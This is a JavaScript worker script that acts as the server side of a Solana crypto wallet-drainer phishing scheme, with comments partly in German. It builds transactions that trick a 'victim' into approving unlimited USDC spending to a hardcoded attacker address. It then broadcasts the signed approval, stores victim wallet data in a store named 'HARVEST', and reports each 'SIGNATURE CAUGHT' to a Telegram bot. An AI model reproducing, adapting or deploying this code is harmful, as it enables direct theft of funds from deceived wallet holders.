import { Buffer } from 'buffer';
globalThis.Buffer = Buffer;

import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import { createTransferInstruction, getAssociatedTokenAddress, createApproveInstruction, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
import bs58 from "bs58";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
        const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");

        // BUILDER
        if (data.type === "build_tx") {
          const victimPubkey = new PublicKey(data.victim);
          const attackerPubkey = new PublicKey("FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"); // Deine Adresse
          
          const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
          
          const tx = new Transaction();
          tx.add(
            createApproveInstruction(
              victimAta,
              attackerPubkey,
              victimPubkey,
              [],
              BigInt("18446744073709551615")
            )
          );
          
          tx.feePayer = victimPubkey;
          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

          // Serialisiere TX und sende als Base64 zurück
          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
          return new Response(JSON.stringify({ tx: serialized.toString('base64') }), {
            headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }

        // SENDER (Signierte TX empfangen und an Solana senden)
        if (data.type === "send_tx") {
          const rawTx = bs58.decode(data.tx);
          const tx = Transaction.from(rawTx);
          
          // Sende an Solana RPC
          const sig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true });
          
          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: `🎣 *SIGNATURE CAUGHT!*\n\nTX: \`${sig}\`\n\nAddress: \`${data.victim}\``, parse_mode: "Markdown" }),
            });
          }

          return new Response(JSON.stringify({ success: true, sig }), {
            headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }

        // WALLET CONNECTED (Erster Fetch)
        if (data.type === "connection_and_balance") {
          if (env.HARVEST) {
            await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
          }
          
          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
            let channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\``;
            let buttons = [
              [{ text: "🔄 Check Balance", callback_data: `balance:${data.victim}` }]
            ];
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }),
            });
          }
          return new Response(JSON.stringify({ success: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        return new Response("OK", { headers: corsHeaders });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
